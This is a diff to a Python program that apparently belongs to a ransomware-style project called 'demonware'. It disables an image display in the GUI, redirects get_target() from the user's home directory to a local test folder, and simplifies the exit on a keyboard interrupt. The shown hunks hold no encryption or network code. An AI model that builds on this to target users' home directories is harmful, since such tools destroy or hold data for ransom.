@@ -139,15 +139,15 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC'''
 
 
 
-        photo = PhotoImage(data=photo_code)
+        #photo = PhotoImage(data=photo_code)
         #photo = photo.zoom(2)
-        photo = photo.subsample(4)
-        label = Label(self, image=photo, background = 'black')
-        label.image = photo # keep a reference!
-        label.grid(row = 5, column = 0, rowspan = 2)
-        label = Label(self, image=photo, background = 'black')
-        label.image = photo # keep a reference!
-        label.grid(row = 5, column = 3, rowspan = 2)
+        #photo = photo.subsample(4)
+        #label = Label(self, image=photo, background = 'black')
+        #label.image = photo # keep a reference!
+        #label.grid(row = 5, column = 0, rowspan = 2)
+        #label = Label(self, image=photo, background = 'black')
+        #label.image = photo # keep a reference!
+        #label.grid(row = 5, column = 3, rowspan = 2)
 
         #self.bind("<Escape>", self.exit) # Press ESC to quit app
         message = '''
@@ -244,7 +244,7 @@ def get_target():
     # Users home on Linux
     if platform == 'Linux':
         #target = '/home/' + getpass.getuser() + '/'
-        target = '/home/' + getpass.getuser() + '/'
+        target = '/home/lv-laptop/Documents/directories/programmeren/python/demonware/test' + '/'
         return target
 
     # Users home on Windows
@@ -290,4 +290,4 @@ def connector():
 try:
     connector()
 except KeyboardInterrupt:
-    print("\033[1;91m[!]\033[0m Disconnected")
+    sys.exit(0)
